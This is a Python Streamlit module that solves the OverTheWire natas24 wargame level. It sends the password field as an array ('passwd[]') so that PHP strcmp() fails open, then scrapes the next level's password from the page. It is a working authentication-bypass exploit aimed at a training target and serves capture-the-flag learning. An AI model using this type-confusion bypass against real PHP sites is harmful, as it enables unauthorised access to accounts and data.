import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting PHP strcmp() Parameter Array Type Confusion...")
    
    # 1. Align active level credentials cleanly
    username = "natas24"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Target index endpoint explicitly
    target_url = "http://natas24.natas.labs.overthewire.org/index.php"
    
    # 2. Supply an array payload structure using dictionary list formatting
    # This turns into passwd[] on the wire, breaking strcmp()
    payload_data = {"passwd[]": "arbitrary_value"}
    st.write(f"📡 Transmitting array payload matrix: `{payload_data}`")
    
    try:
        response = session.post(target_url, data=payload_data, timeout=10)
        
        # 3. Scan output for flag extraction
        if "The credentials for the next level are" in response.text:
            st.success("🎯 PHP loose comparison condition bypassed successfully!")
            
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
            new_tokens = [t for t in all_tokens if t != current_password]
            
            if new_tokens:
                st.success("🎯 Level 24 challenge resolved successfully!")
                st.code(f"Natas 25 Password: {new_tokens[0]}")
            else:
                st.warning("Bypass accepted, but no token sequence matched standard regex filters.")
                with st.expander("Examine Page Source Canvas"):
                    st.code(response.text, language="html")
        else:
            st.error("The target server rejected the array evaluation structure.")
            with st.expander("Examine Response State"):
                st.code(response.text, language="html")
                
    except Exception as e:
        st.error(f"Execution failed due to programmatic error: {str(e)}")